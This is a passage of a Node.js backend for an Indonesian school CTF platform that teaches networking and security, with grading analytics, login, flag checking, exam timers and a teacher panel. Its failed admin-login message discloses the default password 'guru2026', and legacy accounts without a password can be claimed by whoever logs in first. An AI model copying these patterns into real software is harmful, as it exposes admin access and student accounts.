    const linuxPct=categories.Linux.length?Math.round((linuxSolved/categories.Linux.length)*100):0;

    const netSolved=categories.Jaringan.filter(c=>solvedIds.includes(c.id)).length;
    const netPct=categories.Jaringan.length?Math.round((netSolved/categories.Jaringan.length)*100):0;

    const cyberSolved=categories.Cyber.filter(c=>solvedIds.includes(c.id)).length;
    const cyberPct=categories.Cyber.length?Math.round((cyberSolved/categories.Cyber.length)*100):0;

    const hwSolved=categories.Hardware.filter(c=>solvedIds.includes(c.id)).length;
    const hwPct=categories.Hardware.length?Math.round((hwSolved/categories.Hardware.length)*100):0;

    // Nilai Konversi Rapor Skala 0 - 100 (Kurikulum Merdeka)
    // Formula: 70% perolehan XP + 30% rasio ketuntasan kasus
    const xpRatio=totalXP?(userScore/totalXP):0;
    const caseRatio=challengesList.length?(solvedIds.length/challengesList.length):0;
    const finalGrade=Math.min(100, Math.round((xpRatio*70)+(caseRatio*30)));

    let predicate='D (Perlu Bimbingan)';
    if(finalGrade>=88) predicate='A (Sangat Mahir)';
    else if(finalGrade>=75) predicate='B (Mahir)';
    else if(finalGrade>=60) predicate='C (Cukup)';

    // Analisis Kekuatan & Rekomendasi Guru
    const strengths=[];
    const weaknesses=[];
    if(linuxPct>=70) strengths.push('Administrasi Sistem Linux');
    else if(linuxPct<50) weaknesses.push('Administrasi Linux');

    if(netPct>=70) strengths.push('Protokol & Firewall Jaringan');
    else if(netPct<50) weaknesses.push('Keamanan Jaringan & Port');

    if(cyberPct>=60) strengths.push('Keamanan Web & Kriptografi');
    else if(cyberPct<40) weaknesses.push('Web Security & Kripto');

    if(hwPct>=100) strengths.push('Hardware & Serial Console');

    let autoTeacherNote='';
    if(strengths.length && !weaknesses.length){
      autoTeacherNote=`Siswa sangat menguasai bidang ${strengths.join(' dan ')}. Siap untuk materi tingkat mahir atau sertifikasi kejuruan.`;
    }else if(strengths.length){
      autoTeacherNote=`Kuat pada ${strengths.join(', ')}. Disarankan pendampingan pada aspek ${weaknesses.join(', ')}.`;
    }else{
      autoTeacherNote='Perlu penguatan konsep dasar pada perintah Linux dan analisis protokol jaringan.';
    }

    const customTeacherNote = (p.teacherNote || p.notes || '').trim();

    results.push({
      name,
      kelas: p.kelas || 'TJKT',
      nisn: p.nisn || '-',
      solvedCount: solvedIds.length,
      totalCases: challengesList.length,
      score: p.score || userScore,
      speedBonus: p.speedBonus || 0,
      totalXP,
      finalGrade,
      predicate,
      competencies: {
        linux: { solved: linuxSolved, total: categories.Linux.length, pct: linuxPct },
        network: { solved: netSolved, total: categories.Jaringan.length, pct: netPct },
        cyber: { solved: cyberSolved, total: categories.Cyber.length, pct: cyberPct },
        hardware: { solved: hwSolved, total: categories.Hardware.length, pct: hwPct }
      },
      strengths,
      weaknesses,
      teacherNote: customTeacherNote || autoTeacherNote,
      customTeacherNote,
      autoTeacherNote,
      attempts: p.attempts||0
    });
  }

  // Urutkan berdasarkan nilai tertinggi
  return results.sort((a,b)=>b.finalGrade - a.finalGrade || b.score - a.score);
}

const PORT=Number(process.env.PORT||3000);

async function requestHandler(req,res){
try{
  const url=new URL(req.url,'http://localhost');

  /* ================== PUBLIC APIS ================== */

  // 0. Status Database & Supabase Connectivity (Publik)
  if(req.method==='GET'&&url.pathname==='/api/db-status'){
    const cfg=readSupabaseConfig();
    if(cfg.enabled && cfg.url && cfg.key){
      try{
        await supabaseRequest('ctf_students?select=id&limit=1','GET');
        const host = new URL(cfg.url).hostname;
        return send(res,200,{
          connected: true,
          mode: 'supabase',
          host,
          statusText: `DATABASE: 🟢 SUPABASE CLOUD (${host})`
        });
      }catch(err){
        return send(res,200,{
          connected: false,
          mode: 'local',
          error: err.message,
          statusText: 'DATABASE: ⚠️ SUPABASE (PERIKSA IZIN SQL)'
        });
      }
    }
    return send(res,200,{
      connected: false,
      mode: 'local',
      statusText: 'DATABASE: 📁 LOCAL STORAGE'
    });
  }

  // 1. Registrasi Akun Siswa Mandiri (Supabase Utama)
  if(req.method==='POST'&&url.pathname==='/api/register'){
    const b=await body(req);
    const name=cleanName(b.name);
    if(!name) return send(res,400,{error:'Nama siswa harus 2–40 karakter (alfanumerik/spasi).'});
    if(!b.password || String(b.password).length < 4){
      return send(res,400,{error:'Kata sandi / PIN keamanan minimal 4 karakter.'});
    }

    let db=readDB();
    const supabaseCfg=readSupabaseConfig();

    // 1. Cek duplikasi di Supabase jika aktif
    if(supabaseCfg.enabled){
      try{
        const remoteCheck = await supabaseRequest(`ctf_students?name=eq.${encodeURIComponent(name)}&select=id`,'GET');
        if(Array.isArray(remoteCheck) && remoteCheck.length > 0){
          return send(res,409,{error:`Nama "${name}" sudah terdaftar di Supabase! Silakan masuk dengan kata sandi Anda.`});
        }
      }catch(err){
        console.warn('Supabase check duplicate warning:', err.message);
      }
    } else if(db.users[name]){
      return send(res,409,{error:`Nama "${name}" sudah terdaftar! Silakan login atau pilih nama lain.`});
    }

    const passwordHash = hashPassword(b.password);
    db.users[name] = {
      passwordHash,
      kelas: b.kelas || 'TJKT',
      nisn: b.nisn || '',
      solved: [],
      attempts: 0,
      score: 0,
      speedBonus: 0,
      teacherNote: '',
      createdAt: new Date().toISOString()
    };
    writeDB(db);

    // 2. Simpan langsung ke Supabase ctf_students
    if(supabaseCfg.enabled){
      try{
        await supabaseRequest('ctf_students?on_conflict=name','POST',[{
          name,
          password_hash: passwordHash,
          kelas: db.users[name].kelas,
          nisn: db.users[name].nisn,
          solved: [],
          attempts: 0,
          score: 0,
          speed_bonus: 0,
          notes: '',
          last_active: new Date().toISOString()
        }]);
      }catch(err){
        console.warn('Supabase direct register warning:', err.message);
      }
    }

    const token=createStudentToken(name);
    sessions.set(token, name);
    return send(res,200,{
      success:true,
      token,
      name,
      kelas: db.users[name].kelas,
      message:'Registrasi akun siswa berhasil terhubung ke database Supabase!'
    });
  }

  // 2. Login Siswa (Dengan Verifikasi Password / PIN dari Supabase)
  if(req.method==='POST'&&url.pathname==='/api/login'){
    const b=await body(req);
    const name=cleanName(b.name);
    if(!name) return send(res,400,{error:'Nama siswa harus 2–40 karakter alfanumerik.'});
    
    let db=readDB();
    const supabaseCfg=readSupabaseConfig();
    let studentData = db.users[name];

    // 1. Ambil data siswa dari Supabase jika aktif
    if(supabaseCfg.enabled){
      try{
        const remoteRes = await supabaseRequest(`ctf_students?name=eq.${encodeURIComponent(name)}&select=*`,'GET');
        if(Array.isArray(remoteRes) && remoteRes.length > 0){
          const rs = remoteRes[0];
          studentData = {
            passwordHash: rs.password_hash || (studentData ? studentData.passwordHash : ''),
            kelas: rs.kelas || 'TJKT',
            nisn: rs.nisn || '',
            solved: rs.solved || [],
            attempts: rs.attempts || 0,
            score: rs.score || 0,
            speedBonus: rs.speed_bonus || 0,
            teacherNote: rs.notes || ''
          };
          db.users[name] = studentData;
          writeDB(db);
        }
      }catch(err){
        console.warn('Supabase fetch student login warning:', err.message);
      }
    }

    if(!studentData){
      return send(res,404,{error:`Akun "${name}" belum terdaftar. Silakan klik tab "Registrasi Mandiri" untuk mendaftar.`});
    }

    // 2. Verifikasi Kata Sandi
    if(studentData.passwordHash){
      if(!b.password || hashPassword(b.password) !== studentData.passwordHash){
        return send(res,401,{error:'Kata sandi yang Anda masukkan salah. Silakan periksa kembali.'});
      }
    } else if(b.password && String(b.password).length >= 4){
      // Siswa lama tanpa password, pasangkan password pertama kali
      studentData.passwordHash = hashPassword(b.password);
      writeDB(db);
      if(supabaseCfg.enabled){
        supabaseRequest(`ctf_students?name=eq.${encodeURIComponent(name)}`,'PATCH',{
          password_hash: studentData.passwordHash
        }).catch(()=>{});
      }
    }

    const token=createStudentToken(name);
    sessions.set(token, name);

    return send(res,200,{token,name,kelas:studentData.kelas});
  }

  // 3. Status Ujian, Timer & Skor Dinamis (Publik untuk Siswa)
  if(req.method==='GET'&&url.pathname==='/api/exam-status'){
    const db=readDB();
    const cfg=db.examConfig||{examMode:false};
    let remainingSeconds=0;
    let isExpired=false;
    if(cfg.examMode && cfg.examEndTime){
      const diff=Math.floor((cfg.examEndTime - Date.now()) / 1000);
      if(diff <= 0){
        remainingSeconds = 0;
        isExpired = true;
      } else {
        remainingSeconds = diff;
      }
    }
    return send(res,200,{
      examMode: !!cfg.examMode,
      strictDynamic: !!cfg.strictDynamic,
      timerMinutes: cfg.timerMinutes || 60,
      examEndTime: cfg.examEndTime,
      remainingSeconds,
      isExpired: isExpired || !!cfg.isExamLocked,
      dynamicScoring: cfg.dynamicScoring !== false,
      maxBonusSolvers: cfg.maxBonusSolvers || 5
    });
  }

  // 2. Info Kurikulum, Tujuan Pembelajaran & Manfaat TJKT
  if(req.method==='GET'&&url.pathname==='/api/curriculum'){
    return send(res,200,{
      programKeahlian: 'Teknik Jaringan Komputer dan Telekomunikasi (TJKT)',
      kurikulum: 'Kurikulum Merdeka SMK Kejuruan',
      tujuanPembelajaran: [
        {
          kode: 'TP-01',
          bidang: 'Administrasi Sistem Server & Linux',
          deskripsi: 'Peserta didik mampu mengoperasikan sistem operasi jaringan berbasis Linux, mengelola hak akses perizinan berkas (chmod/chown), mendeteksi dotfiles, serta mengaudit konfigurasi layanan server.'
        },
        {
          kode: 'TP-02',
          bidang: 'Keamanan Jaringan & Firewall',
          deskripsi: 'Peserta didik mampu menganalisis lalu lintas data protokol TCP/UDP, membaca log firewall (iptables), memahami konsep port knocking, dan memitigasi serangan brute-force.'
        },
        {
          kode: 'TP-03',
          bidang: 'Keamanan Aplikasi Web & Otorisasi',
          deskripsi: 'Peserta didik mampu mendeteksi kerentanan kritis OWASP Top 10 seperti SQL Injection, manipulasi cookie sesi tanpa tanda tangan digital, dan directory traversal (LFI).'
        },
        {
          kode: 'TP-04',
          bidang: 'Kriptografi & Forensik Digital',
          deskripsi: 'Peserta didik mampu membedakan encoding vs enkripsi, melakukan kriptoanalisis XOR known-plaintext, mendekonstruksi payload reverse shell obfuscated, dan menguji ketahanan hash MD5.'
        },
        {
          kode: 'TP-05',
          bidang: 'Hardware & Embedded Network Systems',
          deskripsi: 'Peserta didik mampu memahami antarmuka fisik perangkat jaringan (router/IoT), pengkabelan serial UART console, dan penyesuaian baud rate untuk mitigasi eksploitasi fisik.'
        }
      ],
      manfaatCTF: [
        'Hands-on Lab Terisolasi: Siswa bereksperimen langsung dengan terminal simulasi tanpa risiko merusak server sekolah nyata.',
        'Pembelajaran Berbasis Tantangan (Challenge-Based Learning): Menumbuhkan Higher Order Thinking Skills (HOTS), daya analisa, dan ketelitian investigasi.',
        'Penyelarasan Kompetensi Industri: Mempersiapkan siswa menghadapi sertifikasi kejuruan (MikroTik MTCNA, Linux Essentials, CompTIA Security+).'
      ],
      tingkatKesulitan: [
        { level: 'Dasar (Low)', xp: '100 XP', deskripsi: 'Perintah dasar navigasi Linux, berkas tersembunyi, port standar IANA, decoding teks.' },
        { level: 'Sedang (Medium)', xp: '150 - 200 XP', deskripsi: 'Eskalasi hak akses SUID, manipulasi cookie session web, SQLi bypass, LFI traversal, cracking hash.' },
        { level: 'Sulit (High)', xp: '200 - 250 XP', deskripsi: 'Analisis log port knocking firewall, XOR cryptanalysis, deobfuscation malware reverse shell, hardware UART baud rate, celah GTFOBins sudoers.' }
      ]
    });
  }

  /* ================== STUDENT AUTHENTICATED APIS ================== */
  if(url.pathname.startsWith('/api/') && !url.pathname.startsWith('/api/admin/')){
    const name=userFor(req);
    if(!name) return send(res,401,{error:'Silakan masuk terlebih dahulu dengan nama siswa.'});
    
    let db=readDB();
    db.users[name]??={solved:[],attempts:0,kelas:'TJKT',nisn:''};
    const progress=db.users[name];
    const allChalls=getAllChallenges();

    // Daftar Tantangan & Progres
    if(req.method==='GET'&&url.pathname==='/api/challenges'){
      const examCfg=db.examConfig||{examMode:false,strictDynamic:false};
      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        try{
          const remoteChalls=await supabaseRequest('ctf_challenges?select=*','GET');
          if(Array.isArray(remoteChalls) && remoteChalls.length>0){
            db.challenges=remoteChalls.map(rc=>({
              id: rc.id,
              topic: rc.topic||'Umum',
              category: rc.category||'Linux',
              title: rc.title,
              difficulty: rc.difficulty,
              points: rc.points,
              summary: rc.summary||'',
              lesson: rc.lesson||'',
              details: Array.isArray(rc.details)?rc.details:[],
              audioText: rc.audio_text||'',
              task: rc.task,
              answers: Array.isArray(rc.answers)?rc.answers:[],
              hint: rc.hint||'',
              explain: rc.explain||''
            })).sort((a,b)=>a.id-b.id);
            writeDB(db);
          }
        }catch(e){
          console.warn('Sync challenges from Supabase warning:', e.message);
        }
      }
      const curChalls=getAllChallenges();
      return send(res,200,{
        challenges: curChalls.map(({answers,answer,...c})=>({
          ...c,
          dynamicFlag: examCfg.examMode ? getStudentDynamicFlag(name, c.id) : undefined,
          examMode: examCfg.examMode
        })),
        progress,
        examMode: examCfg.examMode
      });
    }

    // Submit Jawaban Flag
    if(req.method==='POST'&&url.pathname==='/api/submit'){
      const examCfg=db.examConfig||{examMode:false,strictDynamic:false};
      
      // 1. Verifikasi Batas Waktu Ujian
      if(examCfg.examMode && examCfg.examEndTime){
        if(Date.now() > examCfg.examEndTime || examCfg.isExamLocked){
          return send(res,403,{
            error:'Waktu pengerjaan ujian telah berakhir! Pengiriman flag dinonaktifkan.',
            isExpired: true
          });
        }
      }

      const b=await body(req);
      const c=allChalls.find(x=>x.id===Number(b.id));
      if(!c||typeof b.answer!=='string'||b.answer.length>200) return send(res,400,{error:'Jawaban tidak valid.'});

      if(progress.solved.includes(c.id)){
        return send(res,200,{correct:true,already:true,explain:c.explain,progress});
      }

      progress.attempts++;
      const submitted=b.answer.trim().toLowerCase();
      const validList=(c.answers||(c.answer?[c.answer]:[])).map(a=>String(a).trim().toLowerCase());
      const dynamicFlag=getStudentDynamicFlag(name, c.id).toLowerCase();

      let correct=false;
      if(examCfg.examMode){
        if(examCfg.strictDynamic){
          correct = (submitted === dynamicFlag);
        }else{
          correct = (submitted === dynamicFlag || validList.includes(submitted));
        }
      }else{
        correct = (validList.includes(submitted) || submitted === dynamicFlag);
      }

      let solverRank=0;
      let pointsAwarded=0;
      let speedBonus=0;
      let isFirstBlood=false;

      if(correct){
        progress.solved.push(c.id);

        // Dynamic Scoring & Speed Bonus
        db.solverHistory = db.solverHistory || {};
        db.solverHistory[c.id] = db.solverHistory[c.id] || [];
        solverRank = db.solverHistory[c.id].length + 1;
        const basePoints = c.points || 100;

        if(examCfg.dynamicScoring !== false){
          if(solverRank === 1){
            speedBonus = 30; // First Blood bonus!
            isFirstBlood = true;
          } else if(solverRank === 2){
            speedBonus = 20;
          } else if(solverRank === 3){
            speedBonus = 15;
          } else if(solverRank === 4){
            speedBonus = 10;
          } else if(solverRank === 5){
            speedBonus = 5;
          } else {
            speedBonus = 0;
          }
          pointsAwarded = basePoints + speedBonus;
        } else {
          pointsAwarded = basePoints;
        }

        db.solverHistory[c.id].push({
          studentName: name,
          rank: solverRank,
          points: pointsAwarded,
          speedBonus,
          time: new Date().toISOString()
        });

        progress.score = (progress.score || 0) + pointsAwarded;
        progress.speedBonus = (progress.speedBonus || 0) + speedBonus;
      }
      writeDB(db);

      // Sinkronisasi ke Supabase jika aktif
      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest('ctf_students?name=eq.'+encodeURIComponent(name),'PATCH',{
          solved: progress.solved,
          attempts: progress.attempts,
          score: progress.score || 0,
          speed_bonus: progress.speedBonus || 0,
          last_active: new Date().toISOString()
        }).catch(err=>console.warn('Supabase submit sync warning:',err.message));

        supabaseRequest('ctf_submissions','POST',[{
          student_name: name,
          challenge_id: c.id,
          submitted_answer: b.answer.trim(),
          is_correct: correct,
          solver_rank: solverRank,
          points_awarded: pointsAwarded,
          submitted_at: new Date().toISOString()
        }]).catch(err=>console.warn('Supabase log submission warning:',err.message));
      }

      return send(res,200,{
        correct,
        explain: correct ? c.explain : undefined,
        pointsAwarded,
        solverRank,
        speedBonus,
        isFirstBlood,
        message: isFirstBlood
          ? '🩸 FIRST BLOOD! Anda penjawab pertama (+30 XP Bonus Kecepatan)!'
          : (solverRank > 0 && solverRank <= 5)
            ? `⚡ Penjawab ke-${solverRank} tercepat (+${speedBonus} XP Bonus)!`
            : (correct ? '✓ Flag valid! Analisis Anda berhasil.' : '✕ Flag belum tepat.'),
        progress
      });
    }

    // Papan Peringkat Siswa
    if(req.method==='GET'&&url.pathname==='/api/leaderboard'){
      const leaders=Object.entries(db.users).map(([uName,p])=>({
        name: uName,
        kelas: p.kelas||'TJKT',
        solved: p.solved.length,
        score: p.solved.reduce((n,id)=>n+(allChalls.find(c=>c.id===id)?.points||0),0)
      })).sort((a,b)=>b.score-a.score).slice(0,30);

      return send(res,200,{leaders});
    }
  }

  /* ================== ADMIN / PANEL GURU APIS ================== */
  
  // 1. Login Admin Guru
  if(req.method==='POST'&&url.pathname==='/api/admin/login'){
    const b=await body(req);
    if(b.password===ADMIN_SECRET){
      const token=createAdminToken();
      adminSessions.add(token);
      return send(res,200,{success:true,token,message:'Otorisasi Guru berhasil.'});
    }
    return send(res,401,{error:'Kata sandi Guru/Admin salah. Default: guru2026'});
  }

  // Proteksi rute Admin
  if(url.pathname.startsWith('/api/admin/')){
    if(!isAdmin(req)) return send(res,403,{error:'Akses khusus Guru / Administrator. Silakan login admin dahulu.'});

    let db=readDB();
    const allChalls=getAllChallenges();

    // 2. Laporan Penilaian Siswa & Analisis Kompetensi
    if(req.method==='GET'&&url.pathname==='/api/admin/analytics'){
      const analytics=calculateStudentAnalytics(db, allChalls);
      return send(res,200,{
        analytics,
        totalStudents: Object.keys(db.users).length,
        totalChallenges: allChalls.length,
        totalXP: allChalls.reduce((n,c)=>n+c.points,0)
      });
    }

    // 3. Tambah Soal CTF Baru
    if(req.method==='POST'&&url.pathname==='/api/admin/challenges/add'){
      const b=await body(req);
      if(!b.title || !b.task || !b.answer) return send(res,400,{error:'Judul, Tugas, dan Jawaban wajib diisi.'});

      db.challenges = getAllChallenges();
      const nextId=Math.max(0, ...db.challenges.map(c=>c.id)) + 1;
      const newChallenge={
        id: nextId,
        topic: b.topic || 'Linux Kustom',
        category: ['Linux','Jaringan','Cyber','Hardware'].includes(b.category)?b.category:'Linux',
        title: b.title.trim(),
        difficulty: b.difficulty || 'Sedang (Medium)',
        points: Number(b.points) || 150,
        summary: b.summary || b.lesson.slice(0, 100),
        lesson: b.lesson || 'Materi pembelajaran untuk kasus kustom ini.',
        details: Array.isArray(b.details)&&b.details.length?b.details:[
          {title:'Poin Pembahasan Khusus', content: b.lesson || 'Pelajari konsep terkait untuk memecahkan kasus ini.'}
        ],
        audioText: b.audioText || `${b.title}. ${b.lesson} Tugas: ${b.task}`,
        task: b.task.trim(),
        answers: String(b.answer).split(',').map(s=>s.trim()).filter(Boolean),
        hint: b.hint || 'Perhatikan instruksi dengan cermat.',
        explain: b.explain || 'Jawaban benar telah diverifikasi oleh sistem.'
      };

      db.challenges.push(newChallenge);
      db.challenges.sort((a,b)=>a.id-b.id);
      writeDB(db);

      // Sinkronisasi ke Supabase jika aktif
      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest('ctf_challenges?on_conflict=id','POST',[{
          id: newChallenge.id,
          topic: newChallenge.topic,
          category: newChallenge.category,
          title: newChallenge.title,
          difficulty: newChallenge.difficulty,
          points: newChallenge.points,
          summary: newChallenge.summary,
          lesson: newChallenge.lesson,
          details: newChallenge.details,
          audio_text: newChallenge.audioText,
          task: newChallenge.task,
          answers: newChallenge.answers,
          hint: newChallenge.hint,
          explain: newChallenge.explain
        }]).catch(err=>console.warn('Supabase challenge insert warning:',err.message));
      }

      return send(res,200,{success:true,challenge:newChallenge});
    }

    // 4. Generate Akun Siswa Massal
    if(req.method==='POST'&&url.pathname==='/api/admin/users/generate'){
      const b=await body(req);
      const prefix=cleanName(b.prefix)||'siswa_tjkt';
      const count=Math.min(100, Math.max(1, Number(b.count)||10));
      const kelas=b.kelas||'XII TJKT 1';

      const generated=[];
      for(let i=1; i<=count; i++){
        const num=String(i).padStart(2,'0');
        const studentName=`${prefix}_${num}`;
        if(!db.users[studentName]){
          db.users[studentName]={solved:[],attempts:0,kelas,nisn:`2026${num}`};
        }
        generated.push({name:studentName,kelas,nisn:db.users[studentName].nisn});
      }
      writeDB(db);

      // Sinkronisasi ke Supabase
      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest('ctf_students?on_conflict=name','POST',generated.map(s=>({
          name: s.name,
          kelas: s.kelas,
          nisn: s.nisn,
          solved: [],
          attempts: 0,
          created_at: new Date().toISOString()
        }))).catch(err=>console.warn('Supabase bulk generate warning:',err.message));
      }

      return send(res,200,{success:true,count:generated.length,users:generated});
    }

    // 5. Import Akun Siswa dari CSV
    if(req.method==='POST'&&url.pathname==='/api/admin/users/import-csv'){
      const b=await body(req);
      const csvText=String(b.csvText||'').trim();
      if(!csvText) return send(res,400,{error:'Teks berkas CSV tidak boleh kosong.'});

      const lines=csvText.split(/\r?\n/).filter(line=>line.trim());
      let imported=0;
      const importedList=[];

      for(let i=0; i<lines.length; i++){
        const line=lines[i];
        if(i===0 && (line.toLowerCase().includes('nama') || line.toLowerCase().includes('name'))) continue; // skip header
        const parts=line.split(/[,;\t]/).map(s=>s.replace(/^["']|["']$/g,'').trim());
        if(!parts[0]) continue;

        const sName=cleanName(parts[0]);
        if(!sName) continue;
        const sKelas=parts[1]||'TJKT';
        const sNisn=parts[2]||'';

        if(!db.users[sName]){
          db.users[sName]={solved:[],attempts:0,kelas:sKelas,nisn:sNisn};
        }else{
          db.users[sName].kelas=sKelas;
          if(sNisn) db.users[sName].nisn=sNisn;
        }
        importedList.push({name:sName,kelas:sKelas,nisn:sNisn});
        imported++;
      }

      writeDB(db);

      // Sinkronisasi ke Supabase
      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled && importedList.length){
        supabaseRequest('ctf_students?on_conflict=name','POST',importedList.map(s=>({
          name: s.name,
          kelas: s.kelas,
          nisn: s.nisn,
          solved: [],
          attempts: 0
        }))).catch(err=>console.warn('Supabase CSV import warning:',err.message));
      }

      return send(res,200,{success:true,importedCount:imported});
    }

    // 6. Konfigurasi & Sinkronisasi Supabase
    if(req.method==='GET'&&url.pathname==='/api/admin/supabase/config'){
      const cfg=readSupabaseConfig();
      return send(res,200,{
        url: cfg.url,
        hasKey: !!cfg.key,
        keyPreview: cfg.key ? cfg.key.slice(0, 10)+'••••••••' : '',
        enabled: cfg.enabled
      });
    }

    if(req.method==='POST'&&url.pathname==='/api/admin/supabase/config'){
      const b=await body(req);
      const newCfg={
        url: String(b.url||'').trim(),
        key: String(b.key||'').trim(),
        enabled: !!(b.url && b.key)
      };
      writeSupabaseConfig(newCfg);
      return send(res,200,{success:true,config:{url:newCfg.url,enabled:newCfg.enabled}});
    }

    // Test Koneksi Supabase
    if(req.method==='POST'&&url.pathname==='/api/admin/supabase/test'){
      try{
        const testRes=await supabaseRequest('ctf_students?limit=1','GET');
        return send(res,200,{connected:true,message:'Koneksi ke Supabase berhasil diverifikasi!'});
      }catch(err){
        return send(res,200,{connected:false,error:err.message});
      }
    }

    // Sinkronisasi Penuh Manual (Local <-> Supabase)
    if(req.method==='POST'&&url.pathname==='/api/admin/supabase/sync'){
      try{
        const cfg=readSupabaseConfig();
        if(!cfg.enabled) return send(res,400,{error:'Supabase belum aktif atau belum dikonfigurasi.'});

        // 1. Upload semua siswa lokal ke Supabase
        const studentsToUpload=Object.entries(db.users).map(([uName,p])=>({
          name: uName,
          kelas: p.kelas||'TJKT',
          nisn: p.nisn||'',
          solved: p.solved||[],
          attempts: p.attempts||0,
          last_active: new Date().toISOString()
        }));

        if(studentsToUpload.length){
          await supabaseRequest('ctf_students?on_conflict=name','POST',studentsToUpload);
        }

        // 2. Tarik data siswa dari Supabase ke lokal
        const remoteStudents=await supabaseRequest('ctf_students?select=*','GET');
        if(Array.isArray(remoteStudents)){
          for(const rs of remoteStudents){
            if(!db.users[rs.name]){
              db.users[rs.name]={solved:rs.solved||[],attempts:rs.attempts||0,kelas:rs.kelas,nisn:rs.nisn};
            }else{
              // Gabungkan solved
              const combinedSolved=Array.from(new Set([...(db.users[rs.name].solved||[]), ...(rs.solved||[])]));
              db.users[rs.name].solved=combinedSolved;
              db.users[rs.name].attempts=Math.max(db.users[rs.name].attempts||0, rs.attempts||0);
            }
          }
          writeDB(db);
        }

        return send(res,200,{success:true,message:`Sinkronisasi selesai! ${studentsToUpload.length} data siswa disinkronkan.`});
      }catch(err){
        return send(res,500,{error:'Gagal sinkronisasi: '+err.message});
      }
    }

    // 7. Pengaturan Mode Ujian, Timer & Dynamic Scoring
    if(req.method==='GET'&&url.pathname==='/api/admin/exam-config'){
      const examCfg=db.examConfig||{
        examMode:false,
        strictDynamic:false,
        timerMinutes:60,
        examEndTime:null,
        isExamLocked:false,
        dynamicScoring:true,
        maxBonusSolvers:5
      };
      let remainingSeconds=0;
      let isExpired=false;
      if(examCfg.examMode && examCfg.examEndTime){
        const diff=Math.floor((examCfg.examEndTime - Date.now()) / 1000);
        if(diff <= 0){
          remainingSeconds = 0;
          isExpired = true;
        } else {
          remainingSeconds = diff;
        }
      }
      return send(res,200,{examConfig:{...examCfg, remainingSeconds, isExpired}});
    }

    if(req.method==='POST'&&url.pathname==='/api/admin/exam-config'){
      const b=await body(req);
      const prev=db.examConfig||{};
      
      let endTime = prev.examEndTime;
      if(b.action === 'start_timer'){
        const mins = Number(b.timerMinutes) || 60;
        endTime = Date.now() + (mins * 60 * 1000);
      } else if(b.action === 'stop_timer' || b.action === 'reset_timer'){
        endTime = null;
      }

      db.examConfig={
        examMode: b.examMode !== undefined ? !!b.examMode : !!prev.examMode,
        strictDynamic: b.strictDynamic !== undefined ? !!b.strictDynamic : !!prev.strictDynamic,
        timerMinutes: Number(b.timerMinutes) || prev.timerMinutes || 60,
        examEndTime: endTime,
        isExamLocked: !!b.isExamLocked,
        dynamicScoring: b.dynamicScoring !== undefined ? !!b.dynamicScoring : true,
        maxBonusSolvers: Number(b.maxBonusSolvers) || 5
      };
      writeDB(db);

      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest('ctf_exam_settings?on_conflict=id','POST',[{
          id: 'default_exam',
          settings: db.examConfig,
          updated_at: new Date().toISOString()
        }]).catch(()=>{});
      }

      return send(res,200,{success:true,examConfig:db.examConfig});
    }

    // 8. Kelola Materi & Soal (Database Management)
    if(req.method==='GET'&&url.pathname==='/api/admin/materials'){
      return send(res,200,{materials:allChalls});
    }

    if(req.method==='POST'&&url.pathname==='/api/admin/challenges/save'){
      const b=await body(req);
      const id=Number(b.id);
      if(!id || !b.title || !b.task){
        return send(res,400,{error:'ID kasus, Judul, dan Pertanyaan Tugas wajib diisi.'});
      }

      db.challenges = getAllChallenges();
      const existingIdx = db.challenges.findIndex(c=>c.id===id);

      const challData = {
        id,
        topic: b.topic || 'Umum',
        category: b.category || 'Linux',
        title: b.title.trim(),
        difficulty: b.difficulty || 'Dasar (Low)',
        points: Number(b.points) || 100,
        summary: b.summary || '',
        lesson: b.lesson || '',
        details: Array.isArray(b.details) ? b.details : (typeof b.details === 'string' ? JSON.parse(b.details || '[]') : []),
        audioText: b.audioText || `${b.title}. ${b.lesson} Tugas: ${b.task}`,
        task: b.task.trim(),
        answers: Array.isArray(b.answers) ? b.answers : String(b.answers || '').split(',').map(s=>s.trim()).filter(Boolean),
        hint: b.hint || '',
        explain: b.explain || ''
      };

      if(existingIdx >= 0){
        db.challenges[existingIdx] = challData;
      } else {
        db.challenges.push(challData);
      }
      db.challenges.sort((a,b)=>a.id-b.id);
      writeDB(db);

      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest('ctf_challenges?on_conflict=id','POST',[{
          id: challData.id,
          topic: challData.topic,
          category: challData.category,
          title: challData.title,
          difficulty: challData.difficulty,
          points: challData.points,
          summary: challData.summary,
          lesson: challData.lesson,
          details: challData.details,
          audio_text: challData.audioText,
          task: challData.task,
          answers: challData.answers,
          hint: challData.hint,
          explain: challData.explain
        }]).catch(err=>console.warn('Supabase challenge save warning:',err.message));
      }

      return send(res,200,{success:true,challenge:challData,message:'Materi dan kasus berhasil disimpan ke database!'});
    }

    if(req.method==='POST'&&url.pathname==='/api/admin/challenges/delete'){
      const b=await body(req);
      const id=Number(b.id);
      db.challenges = getAllChallenges().filter(c=>c.id!==id);
      writeDB(db);

      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest(`ctf_challenges?id=eq.${id}`,'DELETE').catch(()=>{});
      }
      return send(res,200,{success:true,message:`Materi ID ${id} berhasil dihapus.`});
    }

    if(req.method==='POST'&&url.pathname==='/api/admin/challenges/reset'){
      db.challenges = JSON.parse(JSON.stringify(baseChallenges));
      writeDB(db);
      return send(res,200,{success:true,message:'Seluruh materi berhasil direset ke 15 kasus bawaan standard.'});
    }

    // 9. Simpan Catatan Khusus Guru (Evaluasi & Peningkatan Siswa)
    if(req.method==='POST'&&url.pathname==='/api/admin/student/notes'){
      const b=await body(req);
      const sName=b.studentName;
      if(!sName || !db.users[sName]) return send(res,404,{error:'Data siswa tidak ditemukan.'});

      db.users[sName].teacherNote = String(b.note || '').trim();
      writeDB(db);

      const supabaseCfg=readSupabaseConfig();
      if(supabaseCfg.enabled){
        supabaseRequest(`ctf_students?name=eq.${encodeURIComponent(sName)}`,'PATCH',{
          notes: db.users[sName].teacherNote
        }).catch(err=>console.warn('Sync note warning:',err.message));
      }

      return send(res,200,{success:true,studentName:sName,teacherNote:db.users[sName].teacherNote});
    }

    // 8. Kunci Jawaban Flag Ujian Unik per Siswa
